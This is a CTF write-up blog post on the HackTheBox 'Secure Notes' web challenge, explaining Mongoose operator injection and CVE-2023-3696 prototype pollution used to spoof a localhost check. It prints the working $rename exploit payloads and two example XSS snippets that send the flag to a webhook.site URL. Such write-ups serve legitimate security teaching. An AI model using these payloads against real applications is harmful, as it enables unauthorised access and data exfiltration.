---
layout: post
title: "JavaScript prototype pollution - HackTheBox challenge writeup (Secure Notes)"
---
## Overview

**Secure Notes** is a challenge in the Web category. It is a minimal notetaking application.

![Secure Notes web UI](/assets/images/secure-notes/ui.png)

Upon inspecting the source code, we see that this is a Node application. There are several endpoints, and it is using MongoDB to store created notes. The target endpoint `/flag` is restricted to localhost:

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
    } else {
        res.status(403).json({ Message: 'Access denied' });
    }
});
```

The goal appears to be to bypass the localhost check. This clued me towards finding an SSRF, and I wasted some time trying to get this to work, as we will see later. However, there's nothing in this application like a browser-side bot or fetch that could be tricked into making a request to `/flag`, otherwise we could exfiltrate the flag to a webhook by making a malicious note like:

```html
<script>
fetch('/flag')
  .then(r => r.text())
  .then(flag => {
      location.href =
        "https://webhook.site/682ba9d7-92b2-46b0-a861-b7867de6e981?flag=" +
        encodeURIComponent(flag);
  });
</script>
```

Indeed, that would be too simple. Looking around more and reading about Mongoose functions, I noticed that

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
        res.json(result);
    } catch (error) {
        console.error(error);
        res.status(500).json({ Message: "An error occurred" });
    }
});
```

has a mass assignment in `findByIdAndUpdate()` where it passes the entire `req.body` in, allowing changes to fields in the entire `Note` schema (instead of just `title` and `content`, the only fields users are supposed to be able to edit). The only named fields in the schema are those two, though:

```js
const Note = mongoose.model('Note', new mongoose.Schema({
	title: String,
	content: String,
}));
```

MongoDB's update API also accepts update operators, so this gives us an operator injection. Here's a breakdown of some operators we could try to use:

| Operator       | Description                                            |
| -------------- | ------------------------------------------------------ |
| `$set`         | Set the value of a field.                              |
| `$unset`       | Remove a field from the document.                      |
| `$rename`      | Rename a field.                                        |
| `$setOnInsert` | Set fields only when an upsert inserts a new document. |

Still, it's not obvious what could be done with any of these to fetch `/flag` server-side. Variations of

```json
{
	"noteId": "<id>",
	"$set": {
		"title": "test",
		"content": "<img src='x' onerror=\"fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/682ba9d7-92b2-46b0-a861-b7867de6e981/?d='+btoa(t)))\">"
	}
}
```

would be useless because this does not use more privileges than what we had initially--we can just edit the title and content directly without an operator injection. Even then, everything is actually HTML-escaped, and as noted earlier, there doesn't appear to be any process running that could potentially view or open this anyway. 

## Prototype pollution

Since the obvious operator tricks don't go anywhere, I checked the library versions. A search of the Mongoose version shows that this application is vulnerable to [CVE-2023-3696](https://www.sentinelone.com/vulnerability-database/cve-2023-3696/).

Modern JavaScript implements inheritance using classes, but this syntax is shorthand for **prototypes**. More specifically, every object in JavaScript has a magic property named `__proto__` which points to its prototype object (sort of its underlying "template" object).

For instance,
```js
function Cat() {}
Cat.prototype.meow = function() { return 'meowwww!!!'; };

const mittens = new Cat();
mittens.name = 'Mittens';

// own properties live on the object
Object.keys(mittens);                        // ['name']
mittens.hasOwnProperty('name');              // true
mittens.hasOwnProperty('meow');              // false

// inherited properties live on the prototype object
Object.keys(Cat.prototype);                  // ['meow']
Cat.prototype.hasOwnProperty('meow');        // true

// __proto__ key which links mittens to Cat:
mittens.__proto__ === Cat.prototype;         // true
```

Of note, an empty object inherits from `Object.prototype`, the ancestor of all objects:
```js
const a = {};

a.__proto__ === Object.prototype;            // true
```

With this in mind, let's return to the challenge. Say we create an empty `Note` (which is a MongoDB `Document` object). According to the schema defined in the code, `Note` has a `title` and `content` field.

This payload gets sent to `/create`:

```json
{
     "title": "::ffff:127.0.0.1",
     "content": ""
}
```

![Burp Suite screenshot of POST request to create endpoint showing successful creation](/assets/images/secure-notes/create.png)

At this point, we have

`note["title"] === "::ffff:127.0.0.1"`

The `$rename` operator we looked at earlier allows us to change the key `title` to anything we like:

```json
{
	"noteId": "<id>",
	"$rename": {
		"title": "__proto__._peername.address"
	}
}
```

![Burp Suite screenshot of POST request to update endpoint](/assets/images/secure-notes/update.png)

This is successfully saved to the database, and on the surface, you'd naively expect the note to have a literal key:

`note["__proto__._peername.address"] === "::ffff:127.0.0.1"`

That is, that replacement string we passed in should just be interpreted as a literal string and set as the new key name. However, this is not the case, which is precisely why the exploit is going to work.

To understand this better, take a look at the vulnerable function in  [CVE-2023-3696](https://www.sentinelone.com/vulnerability-database/cve-2023-3696/) .

At some point, Mongoose populates the properties of all the `Note` objects recursively. It does so in the `_init` function. [(Source)](https://github.com/Automattic/mongoose/blob/305ce4ff789261df7e3f6e72363d0703e025f80d/lib/document.js#L759) But in doing so, it (roughly) does the following:
- it breaks up the literal string `"__proto__._peername.address"` into actual dot notation
- at some point, when parsing the first part of the above dot notation, which is `__proto__`, executes `{}['__proto__']`. As we noted earlier, `{}['__proto__']` resolves to `Object.prototype`. 
- at some point later in its recursive calls, parses the later parts of the dot notation, and finally executes `{}['__proto__']['_peername']['address'] = "::ffff:127.0.0.1"`

Altogether, if we resolve the references, we have that `Object.prototype._peername.address` was set to `::ffff:127.0.0.1`. 

Since `Object.prototype` is the ancestor of all objects in the runtime, **every single object** now inherits this injected property, even objects we don't have direct access to. This is an attack called called **prototype pollution**.

At this point, we can access the `_peername.address` property of any object, and it will have the value `"::ffff:127.0.0.1"`, but why the choice of `_peername.address`?

If we re-examine the code for the target endpoint:
```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    // ...
```

`req.connection` is the underlying `net.Socket`, and `.remoteAddress` is a getter defined on
`net.Socket.prototype` (not an own property of the socket) that reads `this._peername.address`. As noted in this [StackOverflow thread](https://stackoverflow.com/questions/29462807/node-js-issues-with-request-client-peername-address-when-getting-client-ip) I found, `_peername` is not always set on the socket by the time the getter runs. In this case, the lookup climbs through the prototype chain (since it's not on the socket itself) and resolves to our polluted `Object.prototype._peername`. This exploit *only* works because of this timing issue causing the socket to not have its own `_peername` to shadow ours.

This supplies the address being read. We can just get the flag now that the server will read `req.connection.remoteAddress` as `::ffff:127.0.0.1`:

![Burp Suite screenshot of GET request to flag endpoint revealing the flag content](/assets/images/secure-notes/flag.png)
